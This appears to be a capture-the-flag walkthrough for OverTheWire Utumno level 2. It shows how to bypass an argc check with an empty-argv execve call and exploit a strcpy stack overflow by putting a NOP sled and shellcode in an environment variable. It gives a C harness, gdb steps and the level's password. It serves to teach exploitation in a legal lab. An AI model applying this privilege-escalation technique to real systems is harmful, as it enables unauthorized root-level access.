# Utumno Level 2 → 3

## Goal

`utumno2` has a stack overflow via `strcpy` — but it also checks `argc != 0`. Normal command-line invocation always has `argc ≥ 1` (argv[0] is the program name), so you can't satisfy `argc == 0` from a shell. The trick: `execve` lets you invoke a program with **zero** argv entries, which turns `argc` into 0 and lets you past the check. Then exploit the overflow using a payload placed in the environment.

## Concepts you'll learn

- Calling `execve` directly from a C program to pass a truly-zero argv
- Locating the offset from `argv[0]` (or env var 10) on the stack to the saved return address
- Placing NOP-sled + shellcode in an environment variable and jumping into it

## Walkthrough

### 1. Read the source / disasm

Under `gdb` you'll see a prologue like:

```
cmp    DWORD PTR [ebp+0x8], 0x0   ; argc == 0 ?
je     <bypass_check>
```

Then a `strcpy(buf, something)` — often `strcpy(buf, argv[1])` or from an env var.

### 2. Call the binary with argc=0

```c
// /tmp/run.c
#include <unistd.h>
int main(void){
    char *env[] = {
        "PADDING=...",
        /* fill env indices 0..9 with dummies */
        "ATTACK=<nops + shellcode>",   // index 10 or wherever the overflow lands
        NULL
    };
    char *argv[] = { NULL };           // zero argv → argc == 0
    execve("/utumno/utumno2", argv, env);
    return 0;
}
```

Compile: `gcc -m32 -o /tmp/run /tmp/run.c`.

### 3. Find the right environment-variable index

Under `gdb`, step past the `strcpy` and inspect the stack:

```
(gdb) x/20wx $esp
```

You'll see the environment pointers appear in order. Pick an index whose **start address** is easy to land on (NOP-sled into it). Axcheron reports index 10 works for this level.

### 4. Pick a return address

The saved return address is ~132 bytes past the buffer start (for the typical layout — verify with a cyclic pattern). Your payload in `ATTACK` should be:

```
[ 200 NOPs ][ 28-byte shellcode ][ ... ]
```

Set the overflow's return address to land somewhere in the NOP sled.

### 5. Fire

```bash
$ /tmp/run
$ whoami
utumno3
$ cat /etc/utumno_pass/utumno3
ceewaceiph
```

### 6. Why this level is fiddly

The stack-address of your env var shifts with the length of every other env var, every argv string, and every other piece of process setup. In practice you spend time adjusting payload lengths or widening the NOP sled until the jump lands on valid code. Writing the exploit harness in C (as above) makes it reproducible — run it in a loop if needed.

## The answer

The password for `utumno3` is:

**`ceewaceiph`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/utumno/utumno2.html>
